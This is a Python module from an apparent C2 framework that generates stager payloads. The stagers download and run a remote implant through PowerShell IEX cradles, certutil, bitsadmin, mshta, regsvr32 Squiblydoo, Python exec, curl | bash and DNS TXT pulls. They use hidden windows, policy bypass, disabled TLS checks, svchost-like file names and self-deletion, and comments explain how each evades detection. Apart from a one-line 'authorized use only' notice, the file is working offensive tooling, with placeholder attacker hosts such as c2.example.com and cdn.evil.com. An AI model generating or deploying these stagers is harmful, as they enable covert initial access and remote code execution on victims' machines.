"""
Forge C2 - Stager Factory
=============================
Generates lightweight stager payloads that download and execute
the main implant. Stagers are small (< 5KB), fast, and designed
for initial access delivery.

Stager types:
    • HTTP stager:  Download + exec via WinHTTP/curl
    • DNS stager:   Pull payload via TXT record queries
    • SMB stager:   Read payload from named pipe
    • Certutil:     LOLBin stager (certutil -urlcache)
    • BitsAdmin:    LOLBin stager (bitsadmin /transfer)
    • MSHTA:        Script-based stager (mshta http://...)
    • Regsvr32:     COM scriptlet stager

FOR AUTHORIZED RED TEAM OPERATIONS ONLY.
"""
from __future__ import annotations

import base64
import hashlib
import logging
import os
import secrets
import time
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path
from typing import Any

from forge_c2.implant.implant_config import ImplantConfig

log = logging.getLogger("forge.c2.implant.stager")


class StagerType(str, Enum):
    """Available stager types."""
    HTTP_PS       = "http_ps"        # PowerShell HTTP download cradle
    HTTP_CMD      = "http_cmd"       # cmd.exe + certutil/bitsadmin
    HTTP_C        = "http_c"         # C source HTTP stager
    DNS_TXT       = "dns_txt"        # DNS TXT record pull
    SMB_PIPE      = "smb_pipe"       # Named pipe read
    CERTUTIL      = "certutil"       # certutil LOLBin
    BITSADMIN     = "bitsadmin"      # bitsadmin LOLBin
    MSHTA         = "mshta"          # mshta.exe stager
    REGSVR32      = "regsvr32"       # regsvr32 COM scriptlet
    PYTHON        = "python"         # Python one-liner
    CURL_BASH     = "curl_bash"      # curl | bash (Linux)


@dataclass
class StagerConfig:
    """Configuration for stager generation."""
    stager_type:   StagerType = StagerType.HTTP_PS
    payload_url:   str = ""           # URL where the main payload is hosted
    payload_path:  str = ""           # Local path (for SMB/local stagers)
    obfuscate:     bool = True        # Apply basic obfuscation
    delay_seconds: int = 0            # Initial delay before execution
    cleanup:       bool = True        # Self-delete after execution
    env_check:     str = ""           # Environment variable to check before running


class StagerFactory:
    """Factory for generating stager payloads.

    Stagers are tiny delivery mechanisms - their only job is to
    download the main implant and execute it. They should be:
    - Small (< 5KB)
    - Fast (minimal setup)
    - Hard to signature (obfuscated)

    Usage::

        factory = StagerFactory(output_dir="./stagers")
        stager = factory.generate(
            StagerConfig(
                stager_type=StagerType.HTTP_PS,
                payload_url="https://cdn.evil.com/update.ps1",
            ),
        )
        print(stager["path"])
    """

    def __init__(self, output_dir: str = "stagers") -> None:
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)

    def generate(self, config: StagerConfig) -> dict[str, Any]:
        """Generate a stager payload.

        Returns dict with:
            path: output file path
            size: file size in bytes
            sha256: hash
            type: stager type
            one_liner: copy-paste command (when applicable)
        """
        generators = {
            StagerType.HTTP_PS:    self._gen_http_ps,
            StagerType.HTTP_CMD:   self._gen_http_cmd,
            StagerType.CERTUTIL:   self._gen_certutil,
            StagerType.BITSADMIN:  self._gen_bitsadmin,
            StagerType.MSHTA:      self._gen_mshta,
            StagerType.REGSVR32:   self._gen_regsvr32,
            StagerType.PYTHON:     self._gen_python,
            StagerType.CURL_BASH:  self._gen_curl_bash,
            StagerType.DNS_TXT:    self._gen_dns_txt,
        }

        gen_fn = generators.get(config.stager_type)
        if not gen_fn:
            return {"error": f"Unknown stager type: {config.stager_type.value}"}

        content, extension, one_liner = gen_fn(config)

        filename = f"stager_{config.stager_type.value}_{secrets.token_hex(4)}{extension}"
        output_path = self.output_dir / filename

        with open(output_path, "w", encoding="utf-8") as f:
            f.write(content)

        content_bytes = content.encode("utf-8")

        return {
            "path": str(output_path),
            "size": len(content_bytes),
            "sha256": hashlib.sha256(content_bytes).hexdigest(),
            "type": config.stager_type.value,
            "one_liner": one_liner,
        }

    # ── Stager Generators ─────────────────────────────────────────────

    def _gen_http_ps(self, cfg: StagerConfig) -> tuple[str, str, str]:
        """PowerShell HTTP download cradle."""
        url = cfg.payload_url or "https://c2.example.com/update.ps1"

        delay_line = f"Start-Sleep -Seconds {cfg.delay_seconds};" if cfg.delay_seconds > 0 else ""
        env_check = f'if (-not $env:{cfg.env_check}) {{ exit }}; ' if cfg.env_check else ""
        cleanup = "$MyInvocation.MyCommand.Definition | Remove-Item -Force -ErrorAction SilentlyContinue" if cfg.cleanup else ""

        # Basic obfuscation: variable name randomization
        if cfg.obfuscate:
            var_name = f"${secrets.token_hex(3)}"
            cradle = (
                f"{env_check}{delay_line}"
                f"{var_name}=(New-Object Net.WebClient).DownloadString('{url}');"
                f"IEX({var_name})"
            )
        else:
            cradle = f"{env_check}{delay_line}IEX((New-Object Net.WebClient).DownloadString('{url}'))"

        one_liner = (
            f'powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden '
            f'-ExecutionPolicy Bypass -Command "{cradle}"'
        )

        # Full script version
        script = f"""<#
.SYNOPSIS
    Forge C2 Stager - HTTP PowerShell Download Cradle
.DESCRIPTION
    Downloads and executes the main implant from {url}
    Generated: {time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime())}
#>

{delay_line}
{env_check}

try {{
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
    $payload = $wc.DownloadString("{url}")

    # Execute in memory
    IEX($payload)
}} catch {{
    # Silent failure
}}

{cleanup}
"""
        return script, ".ps1", one_liner

    def _gen_http_cmd(self, cfg: StagerConfig) -> tuple[str, str, str]:
        """cmd.exe HTTP stager using PowerShell inner call."""
        url = cfg.payload_url or "https://c2.example.com/update.exe"
        tmp_name = f"svchost_{secrets.token_hex(3)}.exe"

        one_liner = (
            f'cmd.exe /c "powershell -NoP -W Hidden -Ep Bypass -C '
            f'"(New-Object Net.WebClient).DownloadFile(\'{url}\',\'%TEMP%\\{tmp_name}\'); '
            f'Start-Process \'%TEMP%\\{tmp_name}\' -WindowStyle Hidden""'
        )

        script = f"""@echo off
:: Forge C2 Stager - CMD HTTP Download
:: Generated: {time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime())}

{"timeout /t %d /nobreak >nul" % cfg.delay_seconds if cfg.delay_seconds > 0 else ""}

powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command ^
    "(New-Object Net.WebClient).DownloadFile('{url}','%TEMP%\\{tmp_name}'); ^
    Start-Process '%TEMP%\\{tmp_name}' -WindowStyle Hidden"

{"del /f /q \"%~f0\"" if cfg.cleanup else ""}
"""
        return script, ".bat", one_liner

    def _gen_certutil(self, cfg: StagerConfig) -> tuple[str, str, str]:
        """certutil.exe LOLBin stager."""
        url = cfg.payload_url or "https://c2.example.com/update.cer"
        tmp_name = f"update_{secrets.token_hex(3)}"

        one_liner = (
            f'certutil -urlcache -split -f "{url}" %TEMP%\\{tmp_name}.exe '
            f'&& start /b %TEMP%\\{tmp_name}.exe'
        )

        script = f"""@echo off
:: Forge C2 Stager - certutil LOLBin
:: certutil is a trusted Windows binary - less likely to trigger alerts
:: Generated: {time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime())}

{"timeout /t %d /nobreak >nul" % cfg.delay_seconds if cfg.delay_seconds > 0 else ""}

certutil -urlcache -split -f "{url}" "%TEMP%\\{tmp_name}.exe"
start /b "" "%TEMP%\\{tmp_name}.exe"
certutil -urlcache -split -f "{url}" delete

{"del /f /q \"%~f0\"" if cfg.cleanup else ""}
"""
        return script, ".bat", one_liner

    def _gen_bitsadmin(self, cfg: StagerConfig) -> tuple[str, str, str]:
        """bitsadmin.exe LOLBin stager."""
        url = cfg.payload_url or "https://c2.example.com/update.exe"
        tmp_name = f"svchost_{secrets.token_hex(3)}.exe"
        job_name = f"WinUpdate_{secrets.token_hex(4)}"

        one_liner = (
            f'bitsadmin /transfer {job_name} /download /priority foreground '
            f'"{url}" "%TEMP%\\{tmp_name}" && start /b %TEMP%\\{tmp_name}'
        )

        script = f"""@echo off
:: Forge C2 Stager - bitsadmin LOLBin
:: BITS transfers blend with Windows Update traffic
:: Generated: {time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime())}

{"timeout /t %d /nobreak >nul" % cfg.delay_seconds if cfg.delay_seconds > 0 else ""}

bitsadmin /transfer {job_name} /download /priority foreground ^
    "{url}" "%TEMP%\\{tmp_name}"
start /b "" "%TEMP%\\{tmp_name}"

{"del /f /q \"%~f0\"" if cfg.cleanup else ""}
"""
        return script, ".bat", one_liner

    def _gen_mshta(self, cfg: StagerConfig) -> tuple[str, str, str]:
        """mshta.exe stager (HTA execution)."""
        url = cfg.payload_url or "https://c2.example.com/update.hta"

        one_liner = f'mshta.exe "{url}"'

        vbs_dq = '""'  # VBScript doubled quotes (can't put these inside f-string triple quotes)
        content = (
            f"<!-- Forge C2 Stager - MSHTA -->\n"
            f"<!-- Generated: {time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime())} -->\n"
            f"<!-- Execute: mshta.exe {url} -->\n"
            f"<html>\n"
            f'<head><HTA:APPLICATION ID="s" SHOWINTASKBAR="no" WINDOWSTATE="minimize"/></head>\n'
            f"<body>\n"
            f'<script language="VBScript">\n'
            f'Set s = CreateObject("WScript.Shell")\n'
            f"s.Run {vbs_dq}powershell.exe -NoP -W Hidden -Ep Bypass -C "
            f"{vbs_dq}{vbs_dq}IEX((New-Object Net.WebClient).DownloadString('{url}'))"
            f"{vbs_dq}{vbs_dq}{vbs_dq}, 0\n"
            f"self.close()\n"
            f"</script></body></html>\n"
        )

        return content, ".hta", one_liner

    def _gen_regsvr32(self, cfg: StagerConfig) -> tuple[str, str, str]:
        """regsvr32.exe COM scriptlet stager (Squiblydoo)."""
        url = cfg.payload_url or "https://c2.example.com/update.ps1"

        one_liner = (
            f'regsvr32.exe /s /n /u /i:{url} scrobj.dll'
        )

        # SCT (COM scriptlet) file
        content = f"""<?XML version="1.0"?>
<!-- Forge C2 Stager - regsvr32 Squiblydoo -->
<!-- Generated: {time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime())} -->
<!-- Execute: regsvr32 /s /n /u /i:http://... scrobj.dll -->
<scriptlet>
<registration progid="ForgeUpdate" classid="{{GUID}}">
<script language="JScript">
<![CDATA[
    var r = new ActiveXObject("WScript.Shell");
    r.Run("powershell.exe -NoP -W Hidden -Ep Bypass -C IEX((New-Object Net.WebClient).DownloadString('{url}'))", 0);
]]>
</script>
</registration>
</scriptlet>
"""
        return content, ".sct", one_liner

    def _gen_python(self, cfg: StagerConfig) -> tuple[str, str, str]:
        """Python one-liner stager."""
        url = cfg.payload_url or "https://c2.example.com/update.py"

        one_liner = (
            f'python3 -c "import urllib.request,os;'
            f"exec(urllib.request.urlopen('{url}').read())\""
        )

        script = f"""#!/usr/bin/env python3
# Forge C2 Stager - Python Download Cradle
# Generated: {time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime())}

import urllib.request
import ssl
import os
import sys
{"import time; time.sleep(%d)" % cfg.delay_seconds if cfg.delay_seconds > 0 else ""}

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

try:
    payload = urllib.request.urlopen("{url}", context=ctx).read()
    exec(payload)
except Exception:
    pass

{"os.remove(sys.argv[0])" if cfg.cleanup else ""}
"""
        return script, ".py", one_liner

    def _gen_curl_bash(self, cfg: StagerConfig) -> tuple[str, str, str]:
        """curl | bash stager (Linux/macOS)."""
        url = cfg.payload_url or "https://c2.example.com/update.sh"

        one_liner = f'curl -sk {url} | bash'

        script = f"""#!/bin/bash
# Forge C2 Stager - curl | bash
# Generated: {time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime())}

{"sleep %d" % cfg.delay_seconds if cfg.delay_seconds > 0 else ""}

curl -sk "{url}" | bash

{"rm -f \"$0\"" if cfg.cleanup else ""}
"""
        return script, ".sh", one_liner

    def _gen_dns_txt(self, cfg: StagerConfig) -> tuple[str, str, str]:
        """DNS TXT record stager - pulls payload from DNS TXT records."""
        domain = cfg.payload_url or "payload.c2.example.com"

        one_liner = (
            f'powershell.exe -NoP -W Hidden -C '
            f'"IEX((Resolve-DnsName -Type TXT {domain}).Strings -join \'\')"'
        )

        script = f"""<#
.SYNOPSIS
    Forge C2 Stager - DNS TXT Record Pull
.DESCRIPTION
    Pulls encoded payload from DNS TXT records.
    DNS is rarely monitored in real-time.
    Generated: {time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime())}
#>

{"Start-Sleep -Seconds %d" % cfg.delay_seconds if cfg.delay_seconds > 0 else ""}

# Pull payload from DNS TXT records
$chunks = @()
for ($i = 0; $i -lt 100; $i++) {{
    try {{
        $record = Resolve-DnsName -Type TXT "$i.{domain}" -ErrorAction Stop
        $chunks += $record.Strings
    }} catch {{
        break
    }}
}}

# Reassemble and execute
$payload = $chunks -join ''
$decoded = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($payload))
IEX($decoded)
"""
        return script, ".ps1", one_liner

    def list_types(self) -> list[dict[str, str]]:
        """List available stager types."""
        descriptions = {
            "http_ps": "PowerShell HTTP download cradle",
            "http_cmd": "cmd.exe with PowerShell inner call",
            "http_c": "C source HTTP stager",
            "dns_txt": "DNS TXT record payload pull",
            "smb_pipe": "SMB named pipe reader",
            "certutil": "certutil.exe LOLBin (Windows-signed binary)",
            "bitsadmin": "bitsadmin.exe LOLBin (blends with WU traffic)",
            "mshta": "mshta.exe HTA execution",
            "regsvr32": "regsvr32 Squiblydoo (COM scriptlet)",
            "python": "Python urllib download cradle",
            "curl_bash": "curl | bash (Linux/macOS)",
        }
        return [
            {"type": st.value, "description": descriptions.get(st.value, "")}
            for st in StagerType
        ]


# ══════════════════════════════════════════════════════════════════════
#  UNIT TESTS
# ══════════════════════════════════════════════════════════════════════

class TestStagerFactory:
    """Tests for stager factory."""

    def test_list_types(self) -> None:
        import tempfile
        factory = StagerFactory(output_dir=tempfile.mkdtemp())
        types = factory.list_types()
        assert len(types) >= 9
        assert any(t["type"] == "http_ps" for t in types)

    def test_gen_http_ps(self) -> None:
        import tempfile
        factory = StagerFactory(output_dir=tempfile.mkdtemp())
        result = factory.generate(StagerConfig(
            stager_type=StagerType.HTTP_PS,
            payload_url="https://test.com/payload.ps1",
        ))
        assert "error" not in result
        assert result["size"] > 0
        assert result["one_liner"].startswith("powershell")

    def test_gen_certutil(self) -> None:
        import tempfile
        factory = StagerFactory(output_dir=tempfile.mkdtemp())
        result = factory.generate(StagerConfig(
            stager_type=StagerType.CERTUTIL,
            payload_url="https://test.com/payload.exe",
        ))
        assert "certutil" in result["one_liner"]

    def test_gen_curl_bash(self) -> None:
        import tempfile
        factory = StagerFactory(output_dir=tempfile.mkdtemp())
        result = factory.generate(StagerConfig(
            stager_type=StagerType.CURL_BASH,
            payload_url="https://test.com/shell.sh",
        ))
        assert "curl" in result["one_liner"]
        assert result["type"] == "curl_bash"

    def test_gen_python(self) -> None:
        import tempfile
        factory = StagerFactory(output_dir=tempfile.mkdtemp())
        result = factory.generate(StagerConfig(
            stager_type=StagerType.PYTHON,
            payload_url="https://test.com/beacon.py",
        ))
        assert "python" in result["one_liner"]

    def test_gen_dns(self) -> None:
        import tempfile
        factory = StagerFactory(output_dir=tempfile.mkdtemp())
        result = factory.generate(StagerConfig(
            stager_type=StagerType.DNS_TXT,
            payload_url="payload.c2.evil.com",
        ))
        assert "Resolve-DnsName" in result["one_liner"]
